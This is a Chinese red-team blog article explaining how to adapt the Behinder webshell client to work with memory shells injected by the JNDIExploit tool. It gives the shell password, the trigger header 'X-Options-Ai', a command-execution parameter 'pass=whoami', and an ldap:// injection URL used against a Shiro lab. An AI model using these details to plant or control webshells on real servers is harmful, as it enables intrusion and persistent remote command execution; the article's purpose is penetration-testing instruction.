<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484370&idx=1&sn=41144e2b24cf223753b1f631b7a7269b&chksm=c25fcca9f52845bfec4aceb55bbc2e35b95605873193a0a499b9505957039619598ae458b045&scene=21&sessionid=1660985139&key=e8677526fb452b6dd5367ac690234c62e4ee305e9643cb3d4963a0593deeacc5b48812192f2c509783aa096a42aadb95cb3d52306e0eb6ce07b8ea0b4ca0e74dad391de448d988858d3178a947215ad2c5870d86d6b7c5ac46d14e32afa9d41177421a65d1bff39ad696004651b7c1195f890760dd002ae922427fda46061a9b&ascene=15&uin=NTY2NTA4NjQ=&devicetype=Windows%2010%20x64&version=6307051f&lang=zh_CN&session_us=gh_850cc99aa900&exportkey=A3cAv3esMSuuh329rlhnxCw=&acctmode=0&pass_ticket=uyfgm43O%20nte37Omf7S0pmG8umA/6CVPJp/egyZGM04etQwzjCVeYLTpeBxJ%20LOq&wx_header=0&fontgear=2#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ATcz6jUJnFNeOxRzVZ9LbcaA8wBFW4icTiaL7ELd8ia04Olh40TBx7CquHZyCicicl4eYJno2y0oZ0H4A/640?wx_fmt=png)

 **Part1 前言** 
--------------

JNDIExploit 是一款常用的用于 JNDI 注入利用的工具，其大量参考 / 引用了 Rogue JNDI 项目的代码，支持直接植入内存 shell，并集成了常见的 bypass 高版本 JDK 的方式，适用于 JNDI 反序列化漏洞的利用，可直接对出网情况下的 JNDI 进行回显。**JNDIExploit 这款工具注入的冰蝎内存马是经过改造后的冰蝎，网上并没有改造好的与之适配的冰蝎客户端放出来****，原版的冰蝎是连接不上的**，而且网上的相关冰蝎内存马改造文章很少，给大家日常的渗透测试或者红队工作带来了很多不便。今天 ABC_123 就写一篇文章，详细描述一下如何根据 JNDIExploit 工具的内存马改造出一个可用的冰蝎客户端。

**Part2 技术研究过程** 
-----------------

*   **JNDIExploit 注入内存马的代码**
    ------------------------
    

首先查看一下 JNDIExploit 的使用说明，输入命令 java -jar JNDIExploit-1.3-SNAPSHOT.jar -u 即可看到。其中含有 TomcatMemshell1、TomcatMemshell2、WeblogicMemshell1、WeblogicMemshell2 等关键字的功能可以直接注入冰蝎内存马，但是这个工具附带的冰蝎内存马是经过修改的，原版的冰蝎并不能使用，我们并没有与之配套的冰蝎客户端可用。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BFXxO5gF4noCF9V3IIW02iagpGpFkvmNb2xygN76SibX4icVOmMAZKeibHaBKkl0gia8OcdxnjRIGxtWw/640?wx_fmt=png)

接下来去定位一下注入内存马的 java 代码是怎么编写的。将 JNDIExploit 工具使用 Intellij Idea 导入，利用 idea 自带的反编译功能看一下具体的代码实现。首先通过 **MANIFEST.MF 文件找到主类**，一步步跟下去，定位到关键代码。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BFXxO5gF4noCF9V3IIW02ias4lyicyWKotJagEGmiaprJQ1nLsWbyuLHibfuVCHdoaUplia8SlJVWibZqA/640?wx_fmt=png)

接着很容易找到 **TomcatMemshellTemplate1 这个 class 文件**，idea 反编译的结果如下：

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BFXxO5gF4noCF9V3IIW02iaVSSnyWlkx48S9sJypZURKKznfTBAUu4JCpPygr4LZMs5waYKG7HceA/640?wx_fmt=png)

上图很明显可以看到，codeClass 的代码 base64 解密后得到字节码数组，接着通过类加载器还原出这个类，实现内存马的注入。接下来我们将 codeClass 的结果进行 base64 解码，即可得到一个 class 文件，然后对 class 文件进行反编译，就能得到注入内存马的关键代码了。

如下图所示，很明显可以看到，这是一个 Filter 型的内存马。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BFXxO5gF4noCF9V3IIW02iarYeq5GvIsh8Q7tc6KIKfiahR3dGTXrdy0a8u5bwGRaicvib6EwG5kZYjQ/640?wx_fmt=png)

*   **冰蝎马改造的 2 个前提条件**
    ------------------
    

如下图所示，可以直接看到，冰蝎内存马的密码 behinderShellPwd = "e45e329feb5d925b" 解密后是 rebeyond。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BFXxO5gF4noCF9V3IIW02ianmTicYNANAgtyAbJzSjREfFIqCZeIZtCUFeJtmKz67v74mtyCEJdZgg/640?wx_fmt=png)

如下图所示，当消息头含有 **behinderShellHeader = "X-Options-Ai"** 这个请求头，并且请求方法为 POST 时，会进入冰蝎内存马的代码逻辑，说明使用冰蝎马连接的时候，要添加一个自定义的请求头 X-Options-Ai。至此，改造冰蝎的两个前提条件我们已经知道了。其中红色框起来的代码是我们改造冰蝎马的关键所在。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BFXxO5gF4noCF9V3IIW02iaprRMgLdE3eS7lyQvibdpWJ4sC6s105f5iatCJGZFdsd2B7nc0FUibniaMQ/640?wx_fmt=png)

*   **回顾原版冰蝎的工作流程**
    ---------------
    

在改造冰蝎马前，首先回顾一下正常冰蝎马的工作流程：红队人员首先通过上传漏洞将 shell.jsp 文件上传到 tomcat 中间件，成为一个服务端，这个 shell.jsp 文件会接受并处理冰蝎客户端的请求。这个 JSP 文件的内容如下图所示，**其内部定义了一个名称为 U 的继承 ClassLoader 的类加载器，里面还定义了一个名为 g 的方法，会将冰蝎客户端传过来的数据进行处理，找到 Session 对象中存放的冰蝎秘钥**，用这个秘钥将数据进行 AES 解密，然后将解密后的字节数组通过 defineClass 获取到一个 Class 对象，newInstance 之后获取到该类，接着调用这个类中的 equals 方法，equals 方法接收了 jsp 的上下文对象 pageContext，字节数组中是冰蝎客户端事先写好的各种 webshell 的功能，比如说执行命令、上传文件、枚举目录等。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BFXxO5gF4noCF9V3IIW02iaSzYSepoaQOOOuCL5ibJFqoe0BLXicWbL384N69qDqNNdHKQXVR1ZFo1A/640?wx_fmt=png)

冰蝎客户端的关键代码如下所示：反编译冰蝎客户端的 **net.rebeyond.behinder.payload.java.Cmd 这个 class 文件**，发现里面正好有一个 equals 方法，冰蝎客户端会把这个 class 文件转换成字节码，用冰蝎秘钥进行 AES 加密后提交给 shell.jsp 去处理，然后 shell.jsp 通过类加载器将这个类还原出来，并且调用 equals 方法，接着 equals 方法将传入的对象强转成 pageContext 对象，然后通过 pageContext 对象获取 Request、Response，而 Session 对象可以从 request.getSession() 获取到，Session 对象中存放着冰蝎的 key。这里非常关键，**至此我们了解到，无论后续冰蝎内存马怎么改，关键是要能正确获取 Request、Response 这两个对象，因为有了这 2 个对象，什么事情都能做**。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BFXxO5gF4noCF9V3IIW02iaxh3bKdxcmjxdBxichLAuXK2qicnjmrdcumF7n1mNCuhyibumqgrfaGzYg/640?wx_fmt=png)

*   **JNDIExploit 中内存马实现**
    ----------------------
    

接下来看一下 JNDIExploit 工具中的内存马写法，如下图所示：JNDIExploit 内存马（注意与前面的作为服务端的 JSP 马做对比）中的 **equals 方法传入了 2 个对象，分别是 ServletRequest、ServletResponse 对象**，而原版的冰蝎客户端的 equals 方法只传入了一个 Object 对象，也就是 pageContext 对象，这样显然是不能用的。不能用的原因有 2 个：**1、**equals 方法名一样，但是传参个数不一样；**2、**内存马与 JSP 文件不一样，JSP 文件上下文是有 PageContext 对象的，而内存马是通过反射添加了一个 Filter，这个 Filter 的上下文是不存在 PageContext 对象的。原版的冰蝎向 equals 方法传入 PageContext 对象给 Filter，肯定是行不通的（这里挺绕的，新手多看几遍去理解吧，这里如果展开细说，那可就麻烦了）。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BFXxO5gF4noCF9V3IIW02iaprRMgLdE3eS7lyQvibdpWJ4sC6s105f5iatCJGZFdsd2B7nc0FUibniaMQ/640?wx_fmt=png)

*   **改造冰蝎客户端的具体代码**
    ----------------
    

所以接下来关键点来了，我们需要的事情就很明白了，就是把冰蝎客户端的各种 Java 类中的 equals 方法改一下，**传参由只传一个 Object 对象（PageContext 对象），改为传入两个 ServletRequest、ServletResponse 对象**，然后把当前类一系列报错都处理正确即可。我把关键代码完整的图贴出来，让大家少走弯路。为了让新手能看明白，我特意将一些类写成了如 javax.servlet.ServletRequest、javax.servlet.ServletResponse 的全类名形式。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BFXxO5gF4noCF9V3IIW02ia2JNTzjR00RP8pgJtETdp39PPaF1Mo7DZUqiaVRvicAxJfmnKJiaARYx4Q/640?wx_fmt=png)

接下来将原版冰蝎中的 page.getSession() 改成 Session 对象直接获取即可，而 Session 对象是有 Request 对象获取到的，接下来将 page.getOut().clear(); 注释掉，然后 BasicInfo.java 这个类就修改好了。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BFXxO5gF4noCF9V3IIW02iajBW435PvHo4pQicBbjXcrAFOKCHftfibsbjQBGcwR1aV6ib8wuTGHbngQ/640?wx_fmt=png)

如果至此，有朋友还是不理解，那么就按照上面两张图，依葫芦画瓢，照着改吧，我把完整的代码图片都贴出来了。

*   **JNDIExploit 注入的 CMD 内存马**
    ---------------------------
    

以下代码说明 JNDIExploit 在注入一个冰蝎内存马的同时，也注入了一个 CMD 内存马，当提交 **type=basic&pass=whoami**，pass 位置可以直接传入需要执行的命令。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BFXxO5gF4noCF9V3IIW02ia4uicVxGVPBiaSl1VbhVtkkLYicaSSAGAwrFy35ibzqiaVpeCGt4NrQYNacQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BFXxO5gF4noCF9V3IIW02iaQnz0fBicUw5GgkNEcJMaPQpveF6La4jht0ThicfpWGLzNTtGDucfKQMw/640?wx_fmt=png)

*   **改造好的冰蝎客户端测试**
    ---------------
    

首先搭建一个 shiro 反序列化漏洞的测试环境，通过 CommonsBeanutils 链发起一个 jndi 请求，使用 JNDIExploit 的命令 ldap://192.168.237.1:8888/Basic/TomcatMemshell2 注入内存马。  

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BFXxO5gF4noCF9V3IIW02ia30InVycpav2PZHXzd2a4tuCUjtMLpuR3siapuHP99xA1XIu2g2lwwlg/640?wx_fmt=png)

如下图所示，使用 burpsuite 发送上述数据包，提示 “Memshell Inject Success”，说明内存马注入成功。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BFXxO5gF4noCF9V3IIW02iavZWSgiaX3uKkgibxY7kohJibOjqpibqdI231m2RX5drhUicNWCnQ8VicZ7dQ/640?wx_fmt=png)

将改造后的冰蝎客户端按照如下设置，密码为 rebeyond，HTTP 请求头设置 X-Options-Ai：xxxxxx。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BFXxO5gF4noCF9V3IIW02ia0D7vSOdJYQYOmeUrdGFUDYjMu0jhtlTXFyqVdic91xIKAfnD15Jo1ZQ/640?wx_fmt=png)

成功连上，证明冰蝎客户端改造的没有问题，完全可以适用于 JNDIExploit 工具。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BFXxO5gF4noCF9V3IIW02iaicicGazrJnELicgz3R4yVzpNb2w8jGOrgk4kfdp0iaMF8XsyiaHWAZVzAng/640?wx_fmt=png)

 **Part3 总结** 
--------------

1、理解一个技术问题需要理解它的实质，如果下功夫真正对原理理解透彻了，改一个冰蝎内存马就是分分钟的事情了。

2、在有些特殊环境，冰蝎内存马不一定可用，这时候可以试试注入一个哥斯拉的内存马。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A5qqg2iaK6KIYYR8y6pF5Rh3JHDibOKOop204nXz618iawdRb8dABicMPtHb2PkJE8x6koJO5HyuwZJQ/640?wx_fmt=png)

专注于网络安全技术分享，包括红队、蓝队、日常渗透测试、安全体系建设等

每周一篇，99% 原创，敬请关注

![](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450A5qqg2iaK6KIYYR8y6pF5Rhn137KeqqlDkuRyY4G61jATRzyOrCBts8ucxkLpMNsYutSOY7BkPziaw/640?wx_fmt=jpeg)

**往期精彩回顾**

**[第 19 篇：关于近期 cs 服务端被反打的原因分析](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484349&idx=1&sn=c23223a0348336daae18acc4a4790bb8&chksm=c25fccc6f52845d03b30faae72d252256434197d1267d713e60b85810f734368f0be61e62a06&scene=21#wechat_redirect)  
**

[第 18 篇：fastjson 反序列化漏洞区分版本号的方法总结](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484332&idx=1&sn=c787dd0985156d856aad03d56a945be4&chksm=c25fccd7f52845c1e172b864dfc219dcecc9f226fb5abc64ef31178914ad9f58b7868bf6917a&scene=21#wechat_redirect)**[](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484332&idx=1&sn=c787dd0985156d856aad03d56a945be4&chksm=c25fccd7f52845c1e172b864dfc219dcecc9f226fb5abc64ef31178914ad9f58b7868bf6917a&scene=21#wechat_redirect)  
**

[第 17 篇：Shiro 反序列化在 Weblogic 下无利用链的拿权限方法](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484319&idx=1&sn=9da36674830837aa9bcacb3fb6268fd1&chksm=c25fcce4f52845f2ac3cebaf17fd3839fdba74f536ad3da20d1b1126d8ba0e1835853990516c&scene=21#wechat_redirect)

[第 16 篇：Weblogic 2019-2729 反序列化漏洞绕防护拿权限的实战过程](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484303&idx=1&sn=58cbb4d7f63b9276bb89eeac286d174c&chksm=c25fccf4f52845e241256c2f425003b73b6061b3d1964dcd4a184a2cda1b4d8761098227e6de&scene=21#wechat_redirect)

[第 15 篇：内网横向中 windows 各端口远程登录哈希传递的方法总结](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484255&idx=1&sn=e233aa07fdf9de0c8a1bf56fb0954766&chksm=c25fcc24f5284532c5aa27c002d15aa6380c456e2a84299c77b8d43a41892517087258bf867d&scene=21#wechat_redirect)

[第 14 篇：Struts2 框架下 Log4j2 漏洞检测方法分析与总结](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484207&idx=1&sn=285b54a79e48db9a05816cab2e6afc27&chksm=c25fcc54f5284542c1b9abe870e0caa9f958f4da90723bd83292deed215c63c705b7b0bbfaff&scene=21#wechat_redirect)  

[第 13 篇：coldfusion 反序列化过 waf 改 exp 拿靶标的艰难过程](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484191&idx=1&sn=cce12f62b3cf457bc73753b77a083695&chksm=c25fcc64f528457250b11ef6804ee6138c37ed87ab988874cc84d09d04fa6ac1fd36b5e8aa4a&scene=21#wechat_redirect)  

[第 12 篇：给任意 java 程序挂 Socks5 代理方法](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484173&idx=1&sn=e2d454d2447d119bf771a0a511fba994&chksm=c25fcc76f5284560d00355590da0147aca7b7ae2275c095424034245ef32b3d0b28e49c2dbc9&scene=21#wechat_redirect)  

[第 11 篇：盲猜包体对上传漏洞的艰难利用过程](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484162&idx=1&sn=870596fcd1120a6d3ee9688c38aace00&chksm=c25fcc79f528456f9dc0a3b9d9cf54422696a1cd6ffd737ae2c6e33941a25c33d4f6d32fc663&scene=21#wechat_redirect)  

[第 10 篇：IIS 短文件名猜解在拿权限中的巧用](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484145&idx=1&sn=7635430b9b759a2cacdd2c57ba330833&chksm=c25fcd8af528449c1f5c6c703e3668cf6a8dae875ee82ffa67caed66722a0751e3d80d8a6bee&scene=21#wechat_redirect)  

[第 9 篇：Shiro 反序列化数据包解密及蓝队分析工具，提供下载](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484123&idx=1&sn=cb9c039ef92311e56e7742c7c38f6e8a&chksm=c25fcda0f52844b6088b39b769a63b2f6e7a29e8b3ab710961918218d7569089ee4e00072ad9&scene=21#wechat_redirect)  

[第 8 篇：Oracle 注入漏洞绕 waf 的新语句](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484115&idx=1&sn=10c73343ec23f522696692293cd38852&chksm=c25fcda8f52844be2165aa6151c7ad018a4add748673d56523631529e903277633dc44d0abba&scene=21#wechat_redirect)  

[第 7 篇：MS12-020 蓝屏漏洞在实战中的巧用](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484105&idx=1&sn=3aeafa9c172588aaaade47ccacb69370&chksm=c25fcdb2f52844a4a783fceec590c9e12eb06f62dabd7fbffb37e8da23053953a7eae296048d&scene=21#wechat_redirect)  

[第 6 篇：Weblogic 反序列化攻击不依赖日志溯源攻击时间](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484094&idx=1&sn=527236759dc4fd228461195197492507&chksm=c25fcdc5f52844d36bffb96979116d6d3a9ae4fb1a0f320436c7275aea271588c702cea60e5c&scene=21#wechat_redirect)  

[第 5 篇：Shiro Padding Oracle 无 key 的艰难实战利用过程](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484091&idx=1&sn=4dcce59a842f17035d0018bf650671ae&chksm=c25fcdc0f52844d608b6b87d85082b74d5e15888e76001127ff40cc407a46e5e5de446b1365e&scene=21#wechat_redirect)  

[第 4 篇：jsp 型 webshell 被删情况下如何溯源攻击时间](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484004&idx=1&sn=50013b50e48542d156700d76ccbd2f33&chksm=c25fcd1ff528440906bb9089a807c16b747ab5a72cc0279a3c0d18a265cd76cc796df570d594&scene=21#wechat_redirect)  

[第 3 篇：银行 Java 站 SSRF"组合洞" 打法造成的严重危害](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247483984&idx=1&sn=1a018fcefe10124c1726e51a2be05ca7&chksm=c25fcd2bf528443d944a8495ca5c72d8c028fef67de217efe47a8d18b077ae24556842687407&scene=21#wechat_redirect)  

[第 2 篇：区分 Spring 与 Struts2 框架的几种新方法](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247483951&idx=1&sn=fbc1d04ef73a449238a5979a439b1f35&chksm=c25fcd54f528444219f20c2ab14c5970c243fbb10ba04b5bccc0fb0b7cc6d3f542e26f7870bf&scene=21#wechat_redirect)  

[第 1 篇：weblogic9.x 在 JDK1.5 下 T3 反序列化漏洞利用方法](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247483867&idx=1&sn=e0fcaa9f1b58c8085ccd9dc6f74ed336&chksm=c25fcea0f52847b6aeec0409e3290e023b890d603361f103315b39637f89a10dd6fe051dc724&scene=21#wechat_redirect)